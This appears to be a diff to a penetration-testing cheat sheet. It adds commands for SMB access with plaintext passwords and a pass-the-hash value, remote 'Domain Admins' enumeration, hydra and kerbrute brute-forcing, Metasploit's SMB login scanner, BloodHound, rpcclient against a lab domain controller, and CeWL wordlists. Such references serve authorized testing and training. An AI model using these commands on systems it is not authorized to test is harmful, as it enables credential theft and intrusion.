@@ -485,6 +485,7 @@ Thank you for reading.
 | Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
 | SecLists | https://github.com/danielmiessler/SecLists |
 | Username Anarchy | https://github.com/urbanadventurer/username-anarchy |
+| Statistically Likely User Names | https://github.com/insidetrust/statistically-likely-usernames |
 
 ### Reporting
 
@@ -1497,6 +1498,13 @@ snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
 snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
 snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
 snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
+```
+
+#### smbmap 
+```c
+$ smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1
+$ smbmap -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
+$ smbmap -u 'apadmin' -p 'asdf1234!' -d ACME -Hh 10.1.3.30 -x 'net group "Domain Admins" /domain'
 ```
 
 ### Web Application Analysis
@@ -3069,6 +3077,7 @@ hashcat --help | grep -i "ntlm"
 
 ```c
 hashcat --identify --user <FILE>
+hashcat -m  <MODULE> --username --show <HASH_FIle> 
 ```
 
 ```c
@@ -3178,6 +3187,7 @@ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
 hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
 hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
 hydra <RHOST> -C /PATH/TO/WORDLIST/<FILE> ftp
+hydra <RHOST> l <USERNAME> -p <PASSWORD> -m workgroup:{<DOMAIN>} smb2 -t4                // Specify Domain with -m module
 ```
 
 ```c
@@ -3209,7 +3219,7 @@ john --show <FILE>
 ##### User Enumeration
 
 ```c
-./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
+./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> -t 50           // Use to brute for kerberos
 ```
 
 ##### Password Spray
@@ -3894,6 +3904,7 @@ msf6 > use exploit/windows/local/payload_inject              // This module will
 msf6 > use exploit/multi/script/web_delievery                // This module quickly fires up a web server that serves a payload.
 msf6 > use post/multi/gather/peass                           // Multi PEASS launcher
 msf6 > use post/multi/recon/local_exploit_suggester          // Multi Recon Local Exploit Suggester
+msf6 > use auxiliary/scanner/smb/smb_login                   // Load the SMB Login Scanner Module
 ```
 
 ##### Metasploit through Proxychains
@@ -4482,6 +4493,8 @@ sudo apt-get install apt-transport-https
 sudo apt-get install neo4j
 systemctl start neo4j
 ./bloodhound --no-sandbox
+sudo neo4j console                          // Start the DB.
+bloodhound                                  // Start bloodhound as a regular user. 
 ```
 
 >  http://localhost:7474/browser/
@@ -6389,6 +6402,7 @@ pwncat-cs -lp <LPORT>
 
 ```c
 rpcclient -U "" <RHOST>
+rpcclient -U 'username%password' dc01.infiltrator.htb -c <COMMAND>
 ```
 
 ```c
@@ -7962,8 +7976,11 @@ for i in {1..100}; do printf "Password@%d\n" $i >> <FILE>; done
 #### CeWL
 
 ```c
-cewl -d 0 -m 5 -w <FILE> http://<RHOST>/index.php --lowercase
-cewl -d 5 -m 3 -w <FILE> http://<RHOST>/index.php --with-numbers
+cewl -d 0 -m 5 -w <WRITE FILE> http://<RHOST>/index.php --lowercase
+cewl -d 5 -m 3 -w <WRITE FILE> http://<RHOST>/index.php --with-numbers
+cewl -d 2 -w grouped.txt -g 2 http://<RHOST>/index.php                     // Groups words found in pairs.
+grep -E '^[A-Za-z]{3,} [A-Za-z]{3,}$' grouped.txt > clean_pairs.txt     // ^[A-Za-z]{3,} → The first word must be at least 3 letters.
+                                                                        // [A-Za-z]{3,}$ → The second word must also be at least 3 letters.
 ```
 
 #### CUPP
